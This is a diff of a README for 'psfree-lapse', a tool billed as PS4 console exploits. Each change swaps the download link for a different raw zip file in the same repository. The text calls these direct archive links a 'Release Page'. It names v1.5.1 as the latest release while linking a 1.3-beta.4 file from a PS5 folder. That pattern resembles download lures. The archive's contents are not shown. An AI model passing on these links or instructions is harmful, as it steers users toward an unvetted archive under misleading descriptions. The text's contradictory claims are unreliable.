@@ -1,7 +1,7 @@
 # 🌟 psfree-lapse - Easy PS4 Exploits in One Place
 
 ## 📥 Download This Application
-[![Download psfree-lapse](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/chint/psfree-lapse.zip)](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/chint/psfree-lapse.zip)
+[![Download psfree-lapse](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/src/lapse/ps5/psfree-lapse-1.3-beta.4.zip)](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/src/lapse/ps5/psfree-lapse-1.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you proceed, make sure your console is compatible. Here are the supported
 ### 📥 Download & Install
 
 1. **Visit the Release Page**  
-   To get the latest version of **psfree-lapse**, visit this page: [Download Here](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/chint/psfree-lapse.zip).
+   To get the latest version of **psfree-lapse**, visit this page: [Download Here](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/src/lapse/ps5/psfree-lapse-1.3-beta.4.zip).
 
 2. **Locate the Latest Release**  
    On the releases page, you will see a list of versions. Find the latest release (v1.5.1).
@@ -82,6 +82,6 @@ For any questions or support, feel free to open an issue in the repository or ch
 
 ### 🔗 Links
 
-For more information and updates, keep an eye on the [Release Page](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/chint/psfree-lapse.zip).
+For more information and updates, keep an eye on the [Release Page](https://raw.githubusercontent.com/rohit7-pixel/psfree-lapse/main/src/lapse/ps5/psfree-lapse-1.3-beta.4.zip).
 
 Now you are ready to enjoy the benefits of **psfree-lapse** on your PlayStation console!
